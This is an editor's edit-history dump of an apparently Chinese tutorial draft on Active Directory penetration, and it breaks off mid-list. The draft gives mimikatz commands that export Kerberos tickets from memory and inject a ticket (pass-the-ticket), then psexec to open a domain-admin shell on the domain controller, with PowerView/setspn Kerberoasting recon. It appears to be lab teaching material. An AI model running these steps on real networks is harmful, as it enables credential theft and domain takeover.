{"compress":true,"commitItems":[["be9cbcb1-4dae-43b4-a988-804b96106acc",1587975279824,"",[[1587975249004,["whale@Whale",[[1,0,"域渗透入门（三）\n===\n\n\n域渗透入门（二）\r\r\n==="]],[0,0],[29,29]]],[1587975259114,["whale@Whale",[[-1,23,"\r\r\n==="],[1,29,"\n\n## 参考资料"]],[25,28],[32,32]]],[1587975262136,["whale@Whale",[[-1,15,"域渗透入门（二）\n\n"]],[14,24],[14,14]]],[1587975262688,["whale@Whale",[[-1,14,"\n"]],[14,14],[13,13]]],[1587975264177,["whale@Whale",[[-1,9,"==="]],[9,12],[9,9]]],[1587975265760,["whale@Whale",[[1,18,"\n\n"]],[18,18],[19,19]]],[1587975266145,["whale@Whale",[[1,20,"\n"]],[19,19],[20,20]]],[1587975272945,["whale@Whale",[[1,20,"## 录制的视频教程"]],[20,20],[30,30]]],[1587975274239,["whale@Whale",[[1,31,"\n"]],[30,30],[31,31]]],[1587975593498,["whale@Whale",[[1,31,"[域渗透实践篇（二）](https://www.bilibili.com/video/BV1Qz411B7BQ)"]],[31,31],[87,87]]],[1587975595861,["whale@Whale",[[-1,39,"二"]],[40,40],[39,39]]],[1587975597751,["whale@Whale",[[1,39,"四"]],[39,39],[40,40]]],[1587975601492,["whale@Whale",[[1,88,"\n"]],[87,87],[88,88]]],[1587975602947,["whale@Whale",[[-1,88,"\n"],[1,89,"-"]],[88,88],[89,89]]],[1587975604365,["whale@Whale",[[-1,88,"-"],[1,89,"\n"]],[89,89],[88,88]]],[1587975608069,["whale@Whale",[[-1,88,"\n"],[1,89,"1. "]],[88,88],[91,91]]],[1587975608413,["whale@Whale",[[1,91,"\n\n"]],[91,91],[92,92]]],[1587975609555,["whale@Whale",[[-1,92,"\n"],[1,93,"2. "]],[92,92],[95,95]]],[1587975651584,["whale@Whale",[[1,91,"pass the ticket"]],[91,91],[106,106]]],[1587975668180,["whale@Whale",[[1,19,"- 域渗透——Pass The Hash & Pass The Key\r\n"]],[19,19],[56,56]]],[1587975682729,["whale@Whale",[[1,21,"乌云文章："],[-1,54,"\r"]],[21,21],[26,26]]],[1587984071039,["whale@Whale",[[1,151,"\n\n"]],[151,151],[152,152]]],[1587984071277,["whale@Whale",[[1,153,"\n"]],[152,152],[153,153]]],[1587984084788,["whale@Whale",[[-1,153,"\n"],[1,154,"## ptt票据传递实践"]],[153,153],[165,165]]],[1587984084949,["whale@Whale",[[1,165,"\n\n"]],[165,165],[166,166]]],[1587984085469,["whale@Whale",[[1,167,"\n"]],[166,166],[167,167]]],[1587984086519,["whale@Whale",[[1,167,"whoami /user"]],[167,167],[179,179]]],[1587984100520,["whale@Whale",[[1,166,"sekurlsa::tik"]],[166,166],[179,179]]],[1587984100961,["whale@Whale",[[-1,178,"k"]],[179,179],[178,178]]],[1587984106527,["whale@Whale",[[1,178,"ckets /export"]],[178,178],[191,191]]],[1587984192852,["whale@Whale",[[1,166,"\n"]],[165,165],[166,166]]],[1587984193035,["whale@Whale",[[1,167,"\n"]],[166,166],[167,167]]],[1587984199290,["whale@Whale",[[1,166,"dir \\\\OWA2010SP3\\C%"]],[166,166],[185,185]]],[1587984200140,["whale@Whale",[[-1,184,"%"]],[185,185],[184,184]]],[1587984200518,["whale@Whale",[[1,184,"$"]],[184,184],[185,185]]],[1587984929255,["whale@Whale",[[1,26,"<"]],[26,26],[27,27]]],[1587984930651,["whale@Whale",[[-1,26,"<"]],[27,27],[26,26]]],[1587984931404,["whale@Whale",[[1,26,"《"]],[26,26],[27,27]]],[1587984932863,["whale@Whale",[[1,60,"》"]],[60,60],[61,61]]],[1587985365543,["whale@Whale",[[1,61,"、# 域渗透——Pass The Ticket"]],[61,61],[84,84]]],[1587985367750,["whale@Whale",[[-1,62,"# "]],[64,64],[62,62]]],[1587985368558,["whale@Whale",[[1,62,"《"]],[62,62],[63,63]]],[1587985370118,["whale@Whale",[[1,83,"》"]],[83,83],[84,84]]],[1587985664578,["whale@Whale",[[1,237,"\t\t  #导出内存中的票据"]],[237,237],[250,250]]],[1587985664803,["whale@Whale",[[1,251,"\n"]],[250,250],[251,251]]],[1587985665706,["whale@Whale",[[1,252,"\n"]],[251,251],[252,252]]],[1587985665907,["whale@Whale",[[1,253,"\n"]],[252,252],[253,253]]],[1587985666060,["whale@Whale",[[1,254,"\n"]],[253,253],[254,254]]],[1587985686895,["whale@Whale",[[1,251,"kerberos::purge"]],[251,251],[266,266]]],[1587985729030,["whale@Whale",[[1,268,"[0;3e4]-2-1-40e00000-SRV-DB-0DAY$@krbtgt-0DAY.ORG"]],[268,268],[317,317]]],[1587985747990,["whale@Whale",[[1,268,"kerberos::ptt "]],[268,268],[282,282]]],[1587985780185,["whale@Whale",[[1,212,"\n"]],[211,211],[212,212]]],[1587985783715,["whale@Whale",[[1,212,"privelege::"]],[212,212],[223,223]]],[1587985785537,["whale@Whale",[[-1,216,"elege::"]],[223,223],[216,216]]],[1587985788980,["whale@Whale",[[1,216,"ilege::debug"]],[216,216],[228,228]]],[1587985859082,["whale@Whale",[[1,299,"C:\\Users\\Administrator\\Desktop\\"]],[299,299],[330,330]]],[1587986866723,["whale@Whale",[[-1,299,"C:\\Users\\Administrator\\Desktop\\"]],[299,330],[299,299]]]]],["523c7733-f2dd-4682-ae1d-38f315a349b2",1588039258919,"域渗透入门（三）\n\n\n## 参考资料\n- 乌云文章：《域渗透——Pass The Hash & Pass The Key》、《域渗透——Pass The Ticket》\n\n## 录制的视频教程\n[域渗透实践篇（四）](https://www.bilibili.com/video/BV1Qz411B7BQ)\n1. pass the ticket\n2. \n\n## ptt票据传递实践\ndir \\\\OWA2010SP3\\C$\n\nprivilege::debug\nsekurlsa::tickets /export\t\t  #导出内存中的票据\nkerberos::purge\n\nkerberos::ptt [0;3e4]-2-1-40e00000-SRV-DB-0DAY$@krbtgt-0DAY.ORG\n\nwhoami /user\n",[[1588039248429,["whale@Whale",[[1,285,"\n"]],[284,284],[285,285]]],[1588039254310,["whale@Whale",[[1,285,"mimikatze"]],[285,285],[294,294]]],[1588039255787,["whale@Whale",[[-1,292,"ze"]],[294,294],[292,292]]],[1588039257676,["whale@Whale",[[1,292,"z.exe "]],[292,292],[298,298]]],[1588039564645,["whale@Whale",[[1,285,"\n"]],[284,284],[285,285]]],[1588039568196,["whale@Whale",[[1,285,"ky"]],[285,285],[287,287]]],[1588039568837,["whale@Whale",[[-1,285,"ky"]],[287,287],[285,285]]],[1588039573516,["whale@Whale",[[1,212,"\n"]],[211,211],[212,212]]],[1588039574228,["whale@Whale",[[1,212,"·"]],[212,212],[213,213]]],[1588039574711,["whale@Whale",[[-1,212,"·"]],[213,213],[212,212]]],[1588039575650,["whale@Whale",[[1,212,"```"]],[212,212],[215,215]]],[1588039579116,["whale@Whale",[[1,304,"\n"]],[303,303],[304,304]]],[1588039580402,["whale@Whale",[[1,304,"```"]],[304,304],[307,307]]],[1588039583554,["whale@Whale",[[1,288,"y"]],[288,288],[289,289]]],[1588039584008,["whale@Whale",[[-1,288,"y"]],[289,289],[288,288]]],[1588039597121,["whale@Whale",[[1,288,"以上命令可以写成下面的形式"]],[288,288],[301,301]]],[1588039601068,["whale@Whale",[[1,316,"“”"]],[316,316],[318,318]]],[1588039602037,["whale@Whale",[[-1,316,"“”"]],[318,318],[316,316]]],[1588039602930,["whale@Whale",[[1,316,"\"\""]],[316,316],[318,318]]],[1588039607282,["whale@Whale",[[1,317,"privilege::debug"]],[317,317],[333,333]]],[1588039612870,["whale@Whale",[[1,334," \"\""]],[334,334],[337,337]]],[1588039614820,["whale@Whale",[[1,336,"sekurlsa::tickets /export"]],[336,336],[361,361]]],[1588039706715,["whale@Whale",[[1,362,"b "]],[362,362],[364,364]]],[1588039708386,["whale@Whale",[[-1,362,"b "]],[364,364],[362,362]]],[1588039709210,["whale@Whale",[[1,362," fx"]],[362,362],[365,365]]],[1588039709907,["whale@Whale",[[-1,363,"fx"]],[365,365],[363,363]]],[1588039710732,["whale@Whale",[[1,363,"i"]],[363,363],[364,364]]],[1588039711332,["whale@Whale",[[-1,363,"i"]],[364,364],[363,363]]],[1588039712070,["whale@Whale",[[1,363,"exit"]],[363,363],[367,367]]],[1588040852036,["whale@Whale",[[1,372,"\n"]],[371,371],[372,372]]],[1588040856673,["whale@Whale",[[1,372,"m"]],[372,372],[373,373]]],[1588040857552,["whale@Whale",[[-1,372,"m"]],[373,373],[372,372]]],[1588040861919,["whale@Whale",[[1,372,"mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" exit"]],[372,372],[436,436]]],[1588040870970,["whale@Whale",[[-1,437,"kerberos::ptt [0;3e4]-2-1-40e00000-SRV-DB-0DAY$@krbtgt-0DAY.ORG"]],[437,500],[437,437]]],[1588040875357,["whale@Whale",[[-1,386,"privilege::debug\" \"sekurlsa::tickets /export"],[1,430,"kerberos::ptt [0;3e4]-2-1-40e00000-SRV-DB-0DAY$@krbtgt-0DAY.ORG"]],[386,430],[449,449]]],[1588062033596,["whale@Whale",[[-1,371,"\n"],[1,384," \"privilege::debug\" "]],[384,384],[403,403]]],[1588062035397,["whale@Whale",[[1,371,"\n"],[-1,383," \"privilege::debug\" "]],[403,403],[384,384]]],[1588062036196,["whale@Whale",[[1,384,"\n"]],[384,384],[385,385]]],[1588062036436,["whale@Whale",[[1,385,"\n"]],[385,385],[386,386]]],[1588062037409,["whale@Whale",[[1,386,"mimikatz.exe \"privilege::debug\" "]],[386,386],[418,418]]],[1588062042292,["whale@Whale",[[-1,384,"\n\nmimikatz.exe"]],[372,386],[372,372]]],[1588063062787,["whale@Whale",[[1,477,"whaue"]],[477,477],[482,482]]],[1588063063404,["whale@Whale",[[-1,480,"ue"]],[482,482],[480,480]]],[1588063064886,["whale@Whale",[[1,480,"le b"]],[480,480],[484,484]]],[1588063065256,["whale@Whale",[[-1,483,"b"]],[484,484],[483,483]]],[1588063074068,["whale@Whale",[[1,483,"本地管理员用户，ptt"]],[483,483],[494,494]]],[1588063074944,["whale@Whale",[[-1,492,"tt"]],[494,494],[492,492]]],[1588063079105,["whale@Whale",[[1,492,"tt尝试失败"]],[492,492],[498,498]]],[1588063079471,["whale@Whale",[[1,499,"\n"]],[498,498],[499,499]]],[1588063860273,["whale@Whale",[[1,499,"sqladmin，ptt导入成功"]],[499,499],[515,515]]],[1588063869554,["whale@Whale",[[1,507,"y"]],[477,515],[507,508]]],[1588063869831,["whale@Whale",[[1,508,"u"]],[507,508],[507,509]]],[1588063870224,["whale@Whale",[[1,509,"'m"]],[507,509],[507,511]]],[1588063870288,["whale@Whale",[[1,511,"i"]],[507,511],[507,512]]],[1588063870419,["whale@Whale",[[1,512,"'g"]],[507,512],[507,514]]],[1588063870442,["whale@Whale",[[-1,512,"'"],[1,514,"n"]],[507,514],[507,514]]],[1588063870731,["whale@Whale",[[-1,507,"yu'mign"],[1,514,"域名"]],[507,514],[507,509]]],[1588063870928,["whale@Whale",[[-1,508,"名"]],[509,509],[508,508]]],[1588063872526,["whale@Whale",[[1,508,"管理员"]],[508,508],[511,511]]],[1588064167701,["whale@Whale",[[1,498,"，导入失败的原因："]],[498,498],[507,507]]],[1588064168258,["whale@Whale",[[-1,506,"："]],[507,507],[506,506]]],[1588064178887,["whale@Whale",[[1,506,"，票据忘记上传到桌面上了。"]],[506,506],[519,519]]],[1588064472935,["whale@Whale",[[1,191,"\n"]],[190,190],[191,191]]],[1588064482790,["whale@Whale",[[1,191,"一把钥匙"]],[191,191],[195,195]]],[1588064488258,["whale@Whale",[[1,195,"开所有的门锁"]],[195,195],[201,201]]],[1588064491509,["whale@Whale",[[1,191,"pass "]],[191,191],[196,196]]],[1588064491901,["whale@Whale",[[-1,195," "]],[196,196],[195,195]]],[1588064495196,["whale@Whale",[[1,195," the hash: "]],[195,195],[206,206]]],[1588064496294,["whale@Whale",[[1,217,"\n"]],[216,216],[217,217]]],[1588064500492,["whale@Whale",[[1,217,"pass the ticket: zha"]],[217,217],[237,237]]],[1588064501207,["whale@Whale",[[-1,234,"zha"]],[237,237],[234,234]]],[1588064502886,["whale@Whale",[[1,234,"扎到"]],[234,234],[236,236]]],[1588064503393,["whale@Whale",[[-1,234,"扎到"]],[236,236],[234,234]]],[1588064525636,["whale@Whale",[[1,234,"找到备用钥匙，以备用钥匙来开门。"]],[234,234],[250,250]]],[1588064542822,["whale@Whale",[[1,234,"进入"]],[234,234],[236,236]]],[1588064546302,["whale@Whale",[[1,236,"房间后，"]],[236,236],[240,240]]],[1588064550085,["whale@Whale",[[1,246,"（）"]],[246,246],[248,248]]],[1588064554068,["whale@Whale",[[1,247,"高权限票据"]],[247,247],[252,252]]],[1588064578137,["whale@Whale",[[1,263,"有效时间10小时，过期后可以重新导入内存。"]],[263,263],[284,284]]],[1588064578566,["whale@Whale",[[1,285,"\n"]],[284,284],[285,285]]],[1588064579469,["whale@Whale",[[1,286,"\n"]],[285,285],[286,286]]],[1588064581348,["whale@Whale",[[-1,286,"\n"]],[286,286],[285,285]]],[1588064583082,["whale@Whale",[[-1,173,"2. "]],[173,176],[173,173]]],[1588065519409,["whale@Whale",[[1,282,"域内普通"]],[282,282],[286,286]]],[1588065524247,["whale@Whale",[[1,286,"用户获得域名"]],[286,286],[292,292]]],[1588065524551,["whale@Whale",[[-1,291,"名"]],[292,292],[291,291]]],[1588065527796,["whale@Whale",[[1,291,"管理员权限。"]],[291,291],[297,297]]],[1588065528577,["whale@Whale",[[1,298,"\n"]],[297,297],[298,298]]],[1588079877604,["whale@Whale",[[-1,476,"```"]],[476,479],[476,476]]],[1588079879354,["whale@Whale",[[1,581,"```"]],[581,581],[584,584]]],[1588079882023,["whale@Whale",[[-1,585,"whale 本地管理员用户，ptt尝试失败，导入失败的原因，票据忘记上传到桌面上了。\nsqladmin域管理员，ptt导入成功\nwhoami /user"]],[585,661],[585,585]]],[1588079886211,["whale@Whale",[[1,214,"\n"]],[214,214],[215,215]]],[1588079887556,["whale@Whale",[[1,283,"\n"]],[283,283],[284,284]]],[1588079890918,["whale@Whale",[[-1,283,"\n"]],[284,284],[283,283]]],[1588079891349,["whale@Whale",[[-1,282,"\n"]],[283,283],[282,282]]],[1588079892535,["whale@Whale",[[1,282,"      "]],[282,282],[288,288]]],[1588080197626,["whale@Whale",[[-1,281,"。      "]],[282,288],[281,281]]],[1588080199029,["whale@Whale",[[1,281,"。"]],[281,281],[282,282]]],[1588081167131,["whale@Whale",[[-1,585,"\n"],[1,586,"ps e"]],[585,585],[589,589]]],[1588081167567,["whale@Whale",[[-1,587," e"]],[589,589],[587,587]]],[1588081169127,["whale@Whale",[[1,587,"exec "]],[587,587],[592,592]]],[1588081170069,["whale@Whale",[[-1,591," "]],[592,592],[591,591]]],[1588081172883,["whale@Whale",[[1,591,".exe \\\\z"]],[591,591],[599,599]]],[1588081173252,["whale@Whale",[[-1,598,"z"]],[599,599],[598,598]]],[1588081176633,["whale@Whale",[[1,598,"主机名 cmd.exe"]],[598,598],[609,609]]],[1588081244090,["whale@Whale",[[1,585,"\n"]],[584,584],[585,585]]],[1588081245593,["whale@Whale",[[1,585,"## h"]],[585,585],[589,589]]],[1588081246051,["whale@Whale",[[-1,588,"h"]],[589,589],[588,588]]],[1588081249634,["whale@Whale",[[1,588,"获取到域名"]],[588,588],[593,593]]],[1588081249759,["whale@Whale",[[-1,592,"名"]],[593,593],[592,592]]],[1588081252295,["whale@Whale",[[1,592,"管理员之后"]],[592,592],[597,597]]],[1588081255305,["whale@Whale",[[1,595,"权限"]],[595,595],[597,597]]],[1588081260644,["whale@Whale",[[1,600,"\n"]],[599,599],[600,600]]],[1588081267571,["whale@Whale",[[1,600,"net time \\domain ·"]],[600,600],[618,618]]],[1588081268332,["whale@Whale",[[-1,617,"·"]],[618,618],[617,617]]],[1588081269181,["whale@Whale",[[1,617,"#"]],[617,617],[618,618]]],[1588081270804,["whale@Whale",[[1,617,"\t\t"]],[617,617],[619,619]]],[1588081277244,["whale@Whale",[[1,620,"查主机名的"]],[620,620],[625,625]]],[1588081280254,["whale@Whale",[[-1,621,"主机名的"]],[625,625],[621,621]]],[1588081282602,["whale@Whale",[[1,621,"域管理员"]],[621,621],[625,625]]],[1588081284907,["whale@Whale",[[-1,621,"域管理员"]],[625,625],[621,621]]],[1588081286492,["whale@Whale",[[1,621,"域控"]],[621,621],[623,623]]],[1588081288669,["whale@Whale",[[1,623,"的主机名"]],[623,623],[627,627]]],[1588081294909,["whale@Whale",[[1,641,"域控"]],[641,641],[643,643]]],[1588081299481,["whale@Whale",[[1,654,"  \t\t#"]],[654,654],[659,659]]],[1588082755010,["whale@Whale",[[-1,609,"\\"]],[610,610],[609,609]]],[1588082755569,["whale@Whale",[[1,609,"/"]],[609,609],[610,610]]],[1588082774869,["whale@Whale",[[-1,641,"域控主机名"],[1,646,"OWA2010SP3"]],[641,646],[651,651]]],[1588082811996,["whale@Whale",[[1,664,"使用域控主机名，获得域管理员权限的cmd shell"]],[664,664],[690,690]]]]],["a7a402d1-4747-4400-b1d9-0e0ba6bc25dd",1588131639585,"域渗透入门（三）\n\n\n## 参考资料\n- 乌云文章：《域渗透——Pass The Hash & Pass The Key》、《域渗透——Pass The Ticket》\n\n## 录制的视频教程\n[域渗透实践篇（四）](https://www.bilibili.com/video/BV1Qz411B7BQ)\n1. pass the ticket\n\n\n## ptt票据传递实践\npass the hash: 一把钥匙开所有的门锁\n\npass the ticket: 进入房间后，找到备用钥匙（高权限票据），以备用钥匙来开门。有效时间10小时，过期后可以重新导入内存。域内普通用户获得域管理员权限。\n\ndir \\\\OWA2010SP3\\C$\n\n```\nprivilege::debug\nsekurlsa::tickets /export\t\t  #导出内存中的票据\nkerberos::purge\n以上命令可以写成下面的形式\n\nmimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" exit\n\nmimikatz.exe \"privilege::debug\"  \"kerberos::ptt [0;3e4]-2-1-40e00000-SRV-DB-0DAY$@krbtgt-0DAY.ORG\" exit\n```\n## 获取到域管理员权限之后\nnet time /domain \t\t#查域控的主机名\npsexec.exe \\\\OWA2010SP3 cmd.exe  \t\t#使用域控主机名，获得域管理员权限的cmd shell",[[1588131622715,["whale@Whale",[[-1,174,"\n"]],[174,174],[173,173]]]]],["05d925f4-f9aa-46b1-b79d-a076659b3b12",1588164068439,"域渗透入门（三）\n\n\n## 参考资料\n- 乌云文章：《域渗透——Pass The Hash & Pass The Key》、《域渗透——Pass The Ticket》\n\n## 录制的视频教程\n[域渗透实践篇（四）](https://www.bilibili.com/video/BV1Qz411B7BQ)\n1. pass the ticket\n\n## ptt票据传递实践\npass the hash: 一把钥匙开所有的门锁\n\npass the ticket: 进入房间后，找到备用钥匙（高权限票据），以备用钥匙来开门。有效时间10小时，过期后可以重新导入内存。域内普通用户获得域管理员权限。\n\ndir \\\\OWA2010SP3\\C$\n\n```\nprivilege::debug\nsekurlsa::tickets /export\t\t  #导出内存中的票据\nkerberos::purge\n以上命令可以写成下面的形式\n\nmimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" exit\n\nmimikatz.exe \"privilege::debug\"  \"kerberos::ptt [0;3e4]-2-1-40e00000-SRV-DB-0DAY$@krbtgt-0DAY.ORG\" exit\n```\n## 获取到域管理员权限之后\nnet time /domain \t\t#查域控的主机名\npsexec.exe \\\\OWA2010SP3 cmd.exe  \t\t#使用域控主机名，获得域管理员权限的cmd shell",[[1588164065333,["whale@Whale",[[1,85,"- [Kerberos协议探索系列之扫描与爆破篇：域环境和Kerberos协议的说明以及Kerberoasting的攻击方式](https://www.anquanke.com/post/id/171552#h3-5)\r\n"]],[85,85],[196,196]]],[1588164128433,[null,[[-1,194,"\r"],[1,195,"\n"]],[194,194],[196,196]]],[1588164128436,[null,[[1,194,"\r"],[-1,194,"\n"]],[196,196],[194,194]]],[1588164088113,["whale@Whale",[[-1,194,"\r"],[1,196,"- - 关于Kerberos委派的攻击方式及原理"]],[195,195],[219,219]]],[1588164092379,["whale@Whale",[[-1,195,"-"]],[195,196],[195,195]]],[1588164095866,["whale@Whale",[[1,84,"、《》"]],[84,84],[87,87]]],[1588164101491,["whale@Whale",[[1,86,"关于Kerberos委派的攻击方式及原理"]],[86,86],[106,106]]],[1588164104898,["whale@Whale",[[-1,218," - 关于Kerberos委派的攻击方式及原理"]],[218,241],[218,218]]],[1588164154279,["whale@Whale",[[-1,88,"Kerberos委派"]],[88,98],[88,88]]],[1588164185689,["whale@Whale",[[-1,84,"、《关于的攻击方式及原理》"]],[84,97],[84,84]]]]],["190b639c-1af3-415b-a454-2a4b9d968f7b",1588218960745,"域渗透入门（三）\n\n\n## 参考资料\n- 乌云文章：《域渗透——Pass The Hash & Pass The Key》、《域渗透——Pass The Ticket》\n- [Kerberos协议探索系列之扫描与爆破篇：域环境和Kerberos协议的说明以及Kerberoasting的攻击方式](https://www.anquanke.com/post/id/171552#h3-5)\n\n## 录制的视频教程\n[域渗透实践篇（四）](https://www.bilibili.com/video/BV1Qz411B7BQ)\n1. pass the ticket\n\n## ptt票据传递实践\npass the hash: 一把钥匙开所有的门锁\n\npass the ticket: 进入房间后，找到备用钥匙（高权限票据），以备用钥匙来开门。有效时间10小时，过期后可以重新导入内存。域内普通用户获得域管理员权限。\n\ndir \\\\OWA2010SP3\\C$\n\n```\nprivilege::debug\nsekurlsa::tickets /export\t\t  #导出内存中的票据\nkerberos::purge\n以上命令可以写成下面的形式\n\nmimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" exit\n\nmimikatz.exe \"privilege::debug\"  \"kerberos::ptt [0;3e4]-2-1-40e00000-SRV-DB-0DAY$@krbtgt-0DAY.ORG\" exit\n```\n## 获取到域管理员权限之后\nnet time /domain \t\t#查域控的主机名\npsexec.exe \\\\OWA2010SP3 cmd.exe  \t\t#使用域控主机名，获得域管理员权限的cmd shell",[[1588218957755,["whale@Whale",[[-1,253,"Qz411B7BQ"],[1,262,"ve411s7Qd"]],[219,262],[262,262]]],[1588218986540,["whale@Whale",[[1,207,"- "]],[207,207],[209,209]]],[1588218993708,["whale@Whale",[[1,286,"\n"]],[285,285],[286,286]]],[1588218994508,["whale@Whale",[[1,286,"- [域渗透实践篇（四）](https://www.bilibili.com/video/BV1ve411s7Qd)"]],[286,286],[344,344]]],[1588218997069,["whale@Whale",[[-1,296,"四"]],[296,296],[296,296]]],[1588218999314,["whale@Whale",[[1,296,"五"]],[296,296],[297,297]]],[1588219011338,["whale@Whale",[[-1,300,"https://www.bilibili.com/video/BV1ve411s7Qd"]],[305,330],[300,300]]],[1588219014059,["whale@Whale",[[1,302,"\n"]],[301,301],[302,302]]],[1588219014081,["whale@Whale",[[1,302,"、"]],[302,302],[303,303]]],[1588219014899,["whale@Whale",[[-1,302,"、"]],[303,303],[302,302]]],[1588219016656,["whale@Whale",[[1,302,"1/。"]],[302,302],[305,305]]],[1588219017362,["whale@Whale",[[-1,303,"/。"]],[305,305],[303,303]]],[1588219018524,["whale@Whale",[[1,303,"."]],[303,303],[304,304]]],[1588219039883,["whale@Whale",[[1,304," kerberoasting"]],[304,304],[318,318]]],[1588219060889,["whale@Whale",[[1,319,"\n"]],[318,318],[319,319]]],[1588227778922,["whale@Whale",[[1,85,"\n"]],[84,84],[85,85]]],[1588227780072,["whale@Whale",[[1,85,"- "]],[85,85],[87,87]]],[1588227808814,["whale@Whale",[[1,87,"[什么是kerberoasting](https://attack.stealthbits.com/cracking-kerberos-tgs-tickets-using-kerberoasting)"]],[87,87],[187,187]]],[1588228905004,["whale@Whale",[[1,835,"#"]],[835,835],[836,836]]],[1588233938441,["whale@Whale",[[1,939,"\n\n"]],[939,939],[940,940]]],[1588233938621,["whale@Whale",[[1,941,"\n"]],[940,940],[941,941]]],[1588233943240,["whale@Whale",[[-1,941,"\n"],[1,942,"## xinx"]],[941,941],[948,948]]],[1588233944301,["whale@Whale",[[-1,944,"xinx"]],[948,948],[944,944]]],[1588233946087,["whale@Whale",[[1,944,"信息"]],[944,944],[946,946]]],[1588233946607,["whale@Whale",[[-1,944,"信息"]],[946,946],[944,944]]],[1588233950308,["whale@Whale",[[1,944,"搜集spn信息"]],[944,944],[951,951]]],[1588233950501,["whale@Whale",[[1,951,"\n\n"]],[951,951],[952,952]]],[1588233956745,["whale@Whale",[[-1,952,"\n"],[1,953,"import"]],[952,952],[958,958]]],[1588233988528,["whale@Whale",[[1,958,"-module "]],[958,958],[966,966]]],[1588234286577,["whale@Whale",[[1,966,".\\PowerView.ps1"]],[952,966],[981,981]]],[1588234300087,["whale@Whale",[[1,981,"\n\nGet-NetUser -SPN      "]],[981,981],[1004,1004]]],[1588257720051,[null,[[-1,982,"\n"],[1,1005,"\n"]],[982,982],[1006,1006]]],[1588257720051,[null,[[1,982,"\n"],[-1,1004,"\n"]],[1006,1006],[982,982]]],[1588257680238,["whale@Whale",[[1,85,"\n"]],[85,85],[86,86]]],[1588257683132,["whale@Whale",[[1,85,"- [https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)"]],[85,85],[277,277]]],[1588257684285,["whale@Whale",[[1,278,"\n"]],[277,277],[278,278]]],[1588257696355,["whale@Whale",[[1,278,"- [https://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/#gref](https://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/#gref)"]],[278,278],[432,432]]],[1588257698716,["whale@Whale",[[1,433,"\n"]],[432,432],[433,433]]],[1588257842023,[null,[[-1,1331,"\n"],[1,1354,"\n"]],[1331,1331],[1355,1355]]],[1588257842023,[null,[[1,1331,"\n"],[-1,1353,"\n"]],[1355,1355],[1331,1331]]],[1588257811911,["whale@Whale",[[-1,433,"\n"]],[433,433],[432,432]]],[1588257818926,["whale@Whale",[[-1,10,"\n"]],[10,10],[9,9]]],[1588261074050,[null,[[-1,1329,"\n"],[1,1352,"\n"]],[1329,1329],[1353,1353]]],[1588261074050,[null,[[1,1329,"\n"],[-1,1351,"\n"]],[1353,1353],[1329,1329]]],[1588261054293,["whale@Whale",[[1,1299,"\n"]],[1298,1298],[1299,1299]]],[1588261055083,["whale@Whale",[[1,1299,"setspn -q */*"]],[1299,1299],[1312,1312]]],[1588261057821,["whale@Whale",[[1,1299,"\n"]],[1298,1298],[1299,1299]]],[1588261059545,["whale@Whale",[[1,1299,"```"]],[1299,1299],[1302,1302]]],[1588261061062,["whale@Whale",[[1,1370,"\n"]],[1369,1369],[1370,1370]]],[1588261061714,["whale@Whale",[[-1,1370,"\n"],[1,1371,"```"]],[1370,1370],[1373,1373]]],[1588261066667,["whale@Whale",[[1,1316,"\t\t\tl"]],[1316,1316],[1320,1320]]],[1588261067196,["whale@Whale",[[-1,1319,"l"]],[1320,1320],[1319,1319]]],[1588261071172,["whale@Whale",[[1,1319,"#列出"]],[1319,1319],[1322,1322]]],[1588261134015,[null,[[-1,1353,"\n"],[1,1376,"\n"]],[1353,1353],[1377,1377]]],[1588261134015,[null,[[1,1353,"\n"],[-1,1375,"\n"]],[1377,1377],[1353,1353]]],[1588261090931,["whale@Whale",[[1,1322,"服务器的"]],[1322,1322],[1326,1326]]],[1588261092165,["whale@Whale",[[-1,1322,"服务器的"]],[1326,1326],[1322,1322]]],[1588261102827,["whale@Whale",[[1,1322,"域内的spn服务主体名称"]],[1322,1322],[1334,1334]]],[1588261315025,[null,[[-1,1365,"\n"],[1,1388,"\n"]],[1365,1365],[1389,1389]]],[1588261315025,[null,[[1,1365,"\n"],[-1,1387,"\n"]],[1389,1389],[1365,1365]]],[1588261273443,["whale@Whale",[[1,432,"\n"]],[431,431],[432,432]]],[1588261275598,["whale@Whale",[[1,432,"- [https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/](https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/)"]],[432,432],[608,608]]],[1588261313578,["whale@Whale",[[1,609,"\n"]],[608,608],[609,609]]],[1588261314882,["whale@Whale",[[1,609,"- [https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/](https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/)"]],[609,609],[781,781]]],[1588261346764,[null,[[-1,1715,"\n"],[1,1738,"\n"]],[1715,1715],[1739,1739]]],[1588261346764,[null,[[1,1715,"\n"],[-1,1737,"\n"]],[1739,1739],[1715,1715]]],[1588261328538,["whale@Whale",[[1,782,"\n"]],[781,781],[782,782]]],[1588261330553,["whale@Whale",[[1,782,"- [https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/)"]],[782,782],[928,928]]],[1588261343186,["whale@Whale",[[-1,785,"https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-"],[1,841,"# 域渗透——"],[-1,854,"/"]],[785,855],[805,805]]],[1588261345684,["whale@Whale",[[-1,785,"# "]],[786,786],[785,785]]]]],["7602ec56-5819-4aa7-8e93-e0e3a6636c6f",1588304016662,"域渗透入门（三）\n\n## 参考资料\n- 乌云文章：《域渗透——Pass The Hash & Pass The Key》、《域渗透——Pass The Ticket》\n- [https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)\n- [https://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/#gref](https://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/#gref)\n- 